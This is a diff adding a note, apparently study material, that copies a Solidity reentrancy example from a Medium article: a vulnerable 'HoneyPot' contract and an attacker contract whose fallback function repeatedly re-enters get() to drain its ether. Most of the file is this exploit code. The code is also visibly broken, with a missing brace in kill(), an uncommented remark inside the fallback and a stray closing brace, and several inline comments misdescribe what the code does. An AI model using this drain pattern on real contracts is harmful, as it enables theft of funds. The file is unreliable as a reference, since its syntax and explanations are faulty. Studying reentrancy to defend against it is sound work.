@@ -1,0 +1,70 @@
+
+source
+https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
+
+Vulnerable contract!
+------------------------------------------------------------
+pragma solidity ^0.4.8;
+
+contract HoneyPot {
+  mapping (address => uint) public balances;
+
+  function HoneyPot() payable {   //constructor
+    put();
+  }
+
+  function put() payable {
+    balances[msg.sender] = msg.value; //send ether from contract to msg.sender(address who interacts with contract)
+  }
+
+  function get() {
+    if (!msg.sender.call.value(balances[msg.sender])()) {  //if there is any ether in msg.sender balance
+      throw;
+    }
+      balances[msg.sender] = 0; // zero balance of msg.sender  ( ether is sent back to contract address)
+  }
+
+  function() {  //I suspect it is called upon contract creation ,fallback function
+    throw;
+  }
+}
+-------------------------------------------------------------
+
+
+
+
+
+Attacker contract
+-------------------------------------------------------------
+pragma solidity ^0.4.8;
+
+import "./HoneyPot.sol";
+
+contract HoneyPotCollect {
+  HoneyPot public honeypot;
+
+  function HoneyPotCollect (address _honeypot) {  //constructor of attacker contract
+    honeypot = HoneyPot(_honeypot); //create the instance of vulnerable contract, msg.sender = _honeypot address = address we own
+  }
+
+  function kill () 
+    suicide(msg.sender);  //kills  HoneyPotCollect and sends all current contract balance to the address we own (_honeypot)
+  }
+
+  function collect() payable {
+    honeypot.put.value(msg.value)();  // fund _honeypot address
+    honeypot.get();                    //throw cause _honeypot is funded
+  }         
+
+
+    function () payable {   //fallback function which is executed upon HoneyPotCollect contract receives ether.
+    if (honeypot.balance >= msg.value) { send ether from Honeypot to HoneyPotCollect contract address
+      honeypot.get();
+    }
+  }
+}
+
+
+}
+
+----------------------------------------------------------
